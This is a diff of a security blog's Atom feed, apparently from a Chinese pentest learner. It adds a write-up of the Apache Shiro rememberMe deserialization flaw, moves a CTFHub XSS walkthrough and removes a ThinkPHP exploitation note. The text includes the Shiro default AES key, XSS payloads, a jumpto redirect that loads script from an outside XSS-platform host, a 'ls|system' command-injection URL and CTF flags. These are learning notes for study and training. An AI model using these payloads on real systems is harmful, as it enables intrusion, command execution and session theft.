@@ -6,7 +6,7 @@
   <link href="https://blog.m3x1.cn/atom.xml" rel="self"/>
   
   <link href="https://blog.m3x1.cn/"/>
-  <updated>2025-03-19T14:19:17.023Z</updated>
+  <updated>2025-03-20T14:12:24.884Z</updated>
   <id>https://blog.m3x1.cn/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Shiro反序列化漏洞全解析</title>
+    <link href="https://blog.m3x1.cn/posts/78877ffd.html"/>
+    <id>https://blog.m3x1.cn/posts/78877ffd.html</id>
+    <published>2025-03-19T16:00:00.000Z</published>
+    <updated>2025-03-20T14:12:24.884Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="介绍Apache-Shiro-1-2-4-反序列化漏洞（CVE-2016-4437）">介绍<strong>Apache Shiro 1.2.4</strong> 反序列化漏洞（<strong>CVE-2016-4437</strong>）</h2><p>Apache Shiro是⼀款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、</p><p>易⽤，同时也能提供健壮的安全性。</p><p>Apache Shiro 1.2.4及以前版本中，加密的⽤户信息序列化后存储在名为remember-me的Cookie</p><p>中。攻击者可以使⽤Shiro的默认密钥伪造⽤户Cookie，触发Java反序列化漏洞，进⽽在⽬标机</p><p>器上执⾏任意命令。</p><h2 id="漏洞成因">漏洞成因</h2><p>其漏洞的核⼼成因是cookie中的身份信息进⾏了AES加解密，⽤于加解密的密钥应该是绝对保密</p><p>的，但在shiro版本&lt;=1.2.24的版本中使⽤了固定的密钥。因此，验证漏洞的核⼼应该还是在于我</p><p>们（攻击者）可否获得这个AES加密的密钥，如果确实是固定的密钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure><p>或者其他我们可以通过脚本⼯具爆破出来的密钥，那么shiro550漏</p><p>洞才⼀定存在。</p><h2 id="漏洞环境及复现">漏洞环境及复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 下载项⽬</span><br><span class="line"></span><br><span class="line">wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub</span><br><span class="line"></span><br><span class="line">master.zip</span><br><span class="line"></span><br><span class="line">unzip vulhub-master.zip</span><br><span class="line"></span><br><span class="line">cd vulhub-master</span><br><span class="line"></span><br><span class="line"># 进⼊某⼀个漏洞/环境的⽬录</span><br><span class="line"></span><br><span class="line">cd shiro/CVE-2016-4437</span><br><span class="line"></span><br><span class="line"># 启动环境</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br><span class="line"></span><br><span class="line">#启动容器</span><br><span class="line">docker run vulhub/shiro:1.2.4</span><br></pre></td></tr></table></figure><h2 id="Shiro特征"><strong>Shiro</strong>特征</h2><p>⾸先应该判断⼀个⻚⾯的登录是否使⽤了shiro框架进⾏身份验证、授权、密码和会话管理。判断</p><p>⽅法在于：勾选记住密码选项后，点击登录，抓包，观察请求包中是否有rememberme字段，响</p><p>应包中是否有Set-cookie:rememberMe=deleteMe字段。类似于下图这样：</p><blockquote><p>\1. 未登录的情况下，请求包的cookie中没有rememberMe字段，返回包set-Cookie⾥也没有</p><p>deleteMe字段</p><p>\2. 登录失败的话，不管有没有勾选RememberMe字段，返回包都会有 rememberMe= deleteMe</p><p>字段</p><p>\3. 不勾选RememberMe，登录成功的话，返回包set-Cookie⾥有rememberMe=deleteMe字</p><p>段。但是之后的所有请求中Cookie都不会有RememberMe字段</p><p>\4. 勾选RememberMe，登录成功的话，返回包set-Cookie⾥有rememberMe=deleteMe字段，</p><p>还会有remember 字段，之后的所有请求中Cookie都会有rememberMe字段</p><p>\5. 或者可以在cookie后⾯⾃⼰加⼀个rememberMe=1，看返回包有没有rememberMe=</p><p>deleteMe</p></blockquote>]]></content>
+    
+    
+    <summary type="html">🥧Shiro反序列化漏洞全解析；shiro漏洞成因；shiro漏洞环境及shiro漏洞复现；shiro漏洞特征</summary>
+    
+    
+    
+    <category term="web渗透" scheme="https://blog.m3x1.cn/categories/web%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="笔记" scheme="https://blog.m3x1.cn/tags/%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
   
   <entry>
     <title>linux、windows密钥暴力破解工具john的使用</title>
@@ -332,27 +353,6 @@
   </entry>
   
   <entry>
-    <title>CTFHub技能树-XSS</title>
-    <link href="https://blog.m3x1.cn/posts/57dd66d8.html"/>
-    <id>https://blog.m3x1.cn/posts/57dd66d8.html</id>
-    <published>2024-11-27T16:00:00.000Z</published>
-    <updated>2025-02-01T16:19:14.230Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="反射型">反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型">存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射">DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ’  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script src= &gt;</span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词">过滤关键词</h2><p>先用探针试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script</span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote><h2 id="DOM跳转">DOM跳转</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8cc2801a3c464c193d00baffc33e1cf5.png" alt="img"></p><p>分析一下，代码意思是 从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为&quot;jumpto&quot;，则将页面重定向到参数值所指定的URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var target = location.search.split(&quot;=&quot;)</span><br><span class="line">  //以等号分割成两份，一份是参数名，另一份是参数的值（可利用）</span><br><span class="line">        if (target[0].slice(1) == &quot;jumpto&quot;) &#123;</span><br><span class="line">  //其中target[0].slice(1)是指去掉?后面的参数名</span><br><span class="line">            location.href = target[1];</span><br><span class="line">  //如果参数名相等，就location.href（表示页面跳转）到target[1]，也就是参数的值</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以利用js代码和 jQuery 的 $.getScript() 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a827819b269477f8353e9ab693fd778.png" alt="img"></p><p>这里构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c644076cd9fc7c0b.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript(&quot;//xsscom.com//He7bc3&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5d1f1a7369a1089bdaf85bfe5d4c2e11.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81d580917fb146dbd354c87ab6ee6e49.png" alt="img"></p>]]></content>
-    
-    
-    <summary type="html">CTFHub技能树-XSS系列wp</summary>
-    
-    
-    
-    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
-    
-    
-    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
-    
-  </entry>
-  
-  <entry>
     <title>XSS在线平台使用</title>
     <link href="https://blog.m3x1.cn/posts/169f5f8e.html"/>
     <id>https://blog.m3x1.cn/posts/169f5f8e.html</id>
@@ -370,6 +370,27 @@
     
     
     <category term="其他姿势" scheme="https://blog.m3x1.cn/tags/%E5%85%B6%E4%BB%96%E5%A7%BF%E5%8A%BF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CTFHub技能树-XSS</title>
+    <link href="https://blog.m3x1.cn/posts/57dd66d8.html"/>
+    <id>https://blog.m3x1.cn/posts/57dd66d8.html</id>
+    <published>2024-11-27T16:00:00.000Z</published>
+    <updated>2025-02-01T16:19:14.230Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="反射型">反射型</h2><p>打开网站</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9bb879732317d8055c0970fba4a32d29.png" alt="img"></p><p>反射型，直接使用xss平台，将生成的地址传入第一个空</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191232646.png" alt="image-20241128191232646"></p><p>然后将url代码传入第二个空就行</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128191309973.png" alt="image-20241128191309973"></p><p>flag=ctfhub{a51bb55f89d068a011466d62}</p><h2 id="存储型">存储型</h2><p>打开网站，依然像上面的步骤一样。</p><p>区别于前面反射型xss的是，他建立恶意连接是在于每一次都要发送含恶意代码，而这个存储xss不需要，一旦发送过一次，以后每次访问它时，都会含有恶意代码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215208090.png" alt="image-20241128215208090"></p><blockquote><p>flag=ctfhub{1cef0cbbc0bb33244d4a5c76}</p></blockquote><h2 id="DOM反射">DOM反射</h2><p>查看源码位置</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128215659407.png" alt="image-20241128215659407"></p><p>需要闭合前面的 ’  ，所以只需要在xss注入时前面加上’; ，然后把后面的’;注释掉。</p><p>由于前面没有东西了，所以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;&lt;script src= &gt;</span><br></pre></td></tr></table></figure><p>其余步骤一样</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128220249060.png" alt="image-20241128220249060"></p><blockquote><p>flag=ctfhub{aebf8f6244f0ad340612cc6e}</p></blockquote><h2 id="过滤空格">过滤空格</h2><p>步骤一样，空格可以用[/]或者/**/代替</p><blockquote><p>flag=ctfhub{9830f9e82cfbc1e77a1d0dae}</p></blockquote><h2 id="过滤关键词">过滤关键词</h2><p>先用探针试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230131380.png" alt="image-20241128230131380"></p><p>发现没有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script</span><br></pre></td></tr></table></figure><p>所以是过滤了关键字script，可以使用大小写绕过，用sCRiPt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241128230522782.png" alt="image-20241128230522782"></p><blockquote><p>flag=ctfhub{9f0740745ba9e7b754658614}</p></blockquote><h2 id="DOM跳转">DOM跳转</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8cc2801a3c464c193d00baffc33e1cf5.png" alt="img"></p><p>分析一下，代码意思是 从当前页面的URL中获取查询字符串（URL的get参数），如果参数名为&quot;jumpto&quot;，则将页面重定向到参数值所指定的URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">        var target = location.search.split(&quot;=&quot;)</span><br><span class="line">  //以等号分割成两份，一份是参数名，另一份是参数的值（可利用）</span><br><span class="line">        if (target[0].slice(1) == &quot;jumpto&quot;) &#123;</span><br><span class="line">  //其中target[0].slice(1)是指去掉?后面的参数名</span><br><span class="line">            location.href = target[1];</span><br><span class="line">  //如果参数名相等，就location.href（表示页面跳转）到target[1]，也就是参数的值</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>可以利用js代码和 jQuery 的 $.getScript() 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0a827819b269477f8353e9ab693fd778.png" alt="img"></p><p>这里构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c644076cd9fc7c0b.sandbox.ctfhub.com:10800/?jumpto=javascript:$.getScript(&quot;//xsscom.com//He7bc3&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5d1f1a7369a1089bdaf85bfe5d4c2e11.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/81d580917fb146dbd354c87ab6ee6e49.png" alt="img"></p>]]></content>
+    
+    
+    <summary type="html">CTFHub技能树-XSS系列wp</summary>
+    
+    
+    
+    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
+    
+    
+    <category term="web-wp" scheme="https://blog.m3x1.cn/tags/web-wp/"/>
     
   </entry>
   
@@ -405,27 +426,6 @@
     
     
     <summary type="html">🥧随机数种子爆破</summary>
-    
-    
-    
-    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
-    
-    
-    <category term="web姿势" scheme="https://blog.m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>tp漏洞</title>
-    <link href="https://blog.m3x1.cn/posts/3b315222.html"/>
-    <id>https://blog.m3x1.cn/posts/3b315222.html</id>
-    <published>2024-11-24T16:00:00.000Z</published>
-    <updated>2025-02-09T11:31:30.043Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="一-识别tp框架-指纹">一-识别tp框架(指纹)</h2><h3 id="1-1-ioc判断">1.1 ioc判断</h3><p>/favicon.ico</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/20516b1e8de85b6b95343771b66b44df.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241125193711067.png" alt="image-20241125193711067"></p><h3 id="1-2报错">1.2报错</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1c8c509ef3f760f24376d38f6a7625c8.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3b4ccc2eacbbf6163c0ef584d7aeb544.png" alt="img"></p><p>或者 /index.php/index/index/1</p><h3 id="1-3错误传参">1.3错误传参</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/479046ae0c8bf91e2d32d17acc474db9.png" alt="img"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebf2fd7c4ce6bf62b49083a7085bd599.png" alt="img"></p><h3 id="1-4特殊指纹出现logo">1.4特殊指纹出现logo</h3><p>/?c=4e5e5d7364f443e28fbf0d3ae744a59a</p><p>/4e5e5d7364f443e28fbf0d3ae744a59a</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3ddc4ccf08674da045f360091d24546e.png" alt="img"></p><p>p3.1和3.2版本</p><p>4e5e5d7364f443e28fbf0d3ae744a59a-index.html</p><h3 id="1-5-body特征">1.5 body特征</h3><p>body里有&quot;十年磨一剑&quot; 或者&quot;ThinkPHP&quot;</p><h3 id="1-6插件">1.6插件</h3><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0684f3dbf50af3128a16c0a775d03eb4.png" alt="img"></p><h2 id="二、利用方法">二、利用方法</h2><p>数据通过竖线分开, 前面为参数, 后面为函数。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?cacheTime=0&amp;isCache=ls|system  </span><br><span class="line">/index.php/?cacheTime=0&amp;isCache=ls|system   #上面不行就换下面</span><br></pre></td></tr></table></figure><p>根据 thinkphp 的路由规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">由于ThinkPHP存在两种路由规则，如下所示</span><br><span class="line">http://serverName/index.php/模块/控制器/操作/[参数名/参数值...]</span><br><span class="line">如果不支持PATHINFO的服务器可以使用兼容模式访问如下：</span><br><span class="line">http://serverName/index.php?s=/模块/控制器/操作/[参数名/参数值...]</span><br><span class="line">也可采用 index.php/a/b/c/$&#123;code&#125;一下形式。</span><br></pre></td></tr></table></figure><p>访问 <code>/index.php/index/index</code>，能够走到题目给出的<code>Index\index</code>里。</p><p>所以一般要先加上路由路径。</p>]]></content>
-    
-    
-    <summary type="html">🥧tp漏洞</summary>
     
     
     
